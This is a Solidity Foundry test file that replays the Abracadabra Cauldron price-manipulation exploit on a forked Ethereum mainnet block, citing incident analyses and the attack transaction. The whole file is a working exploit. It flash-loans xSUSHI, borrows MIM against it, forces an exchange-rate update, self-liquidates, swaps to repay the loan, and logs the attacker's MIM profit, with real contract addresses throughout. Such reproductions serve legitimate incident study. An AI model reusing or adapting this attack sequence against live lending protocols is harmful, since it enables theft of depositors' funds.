// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://eigenphi.substack.com/p/casting-a-magic-spell-on-abracadabra
// https://twitter.com/BlockSecTeam/status/1603633067876155393
// @TX
// https://etherscan.io/tx/0x3d163bfbec5686d428a6d43e45e2626a220cc4fcfac7620c620b82c1f2537c78

interface BentoBoxV1 {
    function batchFlashLoan(
        address borrower,
        address[] calldata receivers,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata data
    ) external;

    function setMasterContractApproval(
        address user,
        address masterContract,
        bool approved,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function deposit(address token_, address from, address to, uint256 amount, uint256 share) external;

    function withdraw(address token_, address from, address to, uint256 amount, uint256 share) external;

    function balanceOf(address token, address account) external returns (uint256);
}

interface CauldronMediumRiskV1 {
    function addCollateral(address to, bool skim, uint256 share) external;

    function borrow(address to, uint256 amount) external;

    function updateExchangeRate() external;

    function liquidate(
        address[] calldata users,
        uint256[] calldata maxBorrowParts,
        address to,
        address swapper
    ) external;
}

contract ContractTest is Test {
    BentoBoxV1 BentBox = BentoBoxV1(0xF5BCE5077908a1b7370B9ae04AdC565EBd643966);
    CauldronMediumRiskV1 Cauldron = CauldronMediumRiskV1(0xbb02A884621FB8F5BFd263A67F58B65df5b090f3);
    IERC20 xSUSHI = IERC20(0x8798249c2E607446EfB7Ad49eC89dD1865Ff4272);
    IERC20 MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ISushiSwap Router = ISushiSwap(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    address masterContract = 0x4a9Cb5D0B755275Fd188f87c0A8DF531B0C7c7D2;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15_928_289);
    }

    function testExploit() public {
        MIM.approve(address(Router), type(uint256).max);
        address[] memory receivers = new address[](2);
        receivers[0] = address(this);
        receivers[1] = address(this);
        address[] memory tokens = new address[](2);
        tokens[0] = address(xSUSHI);
        tokens[1] = address(MIM);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 450_000 * 1e18;
        amounts[1] = 0;
        BentBox.batchFlashLoan(address(this), receivers, tokens, amounts, new bytes(1));

        emit log_named_decimal_uint("[End] Attacker MIM balance after exploit", MIM.balanceOf(address(this)), 18);
    }

    function onBatchFlashLoan(
        address sender,
        IERC20[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata fees,
        bytes calldata data
    ) external {
        BentBox.setMasterContractApproval(address(this), masterContract, true, uint8(0), bytes32(0), bytes32(0));
        xSUSHI.approve(address(BentBox), type(uint256).max);
        BentBox.deposit(address(xSUSHI), address(this), address(this), 0, 420_000 * 1e18);
        Cauldron.addCollateral(address(this), false, 420_000 * 1e18);
        Cauldron.borrow(address(this), 800_000 * 1e18);
        Cauldron.updateExchangeRate();
        address[] memory users = new address[](1);
        users[0] = address(this);
        uint256[] memory maxBorrowParts = new uint256[](1);
        maxBorrowParts[0] = 680_000 * 1e18;
        Cauldron.liquidate(users, maxBorrowParts, address(this), address(0));
        BentBox.withdraw(
            address(xSUSHI), address(this), address(this), 0, BentBox.balanceOf(address(xSUSHI), address(this))
        );
        BentBox.withdraw(address(MIM), address(this), address(this), 0, BentBox.balanceOf(address(MIM), address(this)));
        uint256 swapAmount = 450_000 * 1e18 * 10_005 / 10_000 - xSUSHI.balanceOf(address(this));
        address[] memory path = new address[](3);
        path[0] = address(MIM);
        path[1] = address(WETH);
        path[2] = address(xSUSHI);
        Router.swapTokensForExactTokens(swapAmount, type(uint256).max, path, address(this), block.timestamp);
        xSUSHI.transfer(address(BentBox), 450_225 * 1e18);
    }
}
